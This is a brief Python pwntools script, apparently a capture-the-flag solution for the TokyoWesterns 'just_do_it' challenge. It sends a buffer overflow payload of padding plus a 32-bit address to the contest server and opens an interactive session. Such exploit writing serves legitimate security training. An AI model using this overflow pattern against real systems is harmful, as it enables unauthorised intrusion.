# !/usr/bin/env python
# powerprove

from pwn import *

if __name__ == "__main__":
	#s = process("./just_do_it")
	s = remote("pwn1.chal.ctf.westerns.tokyo",12482)
	payload = "A"*0x14
	payload += p32(0x804A080)
	s.sendline(payload)
	s.interactive()
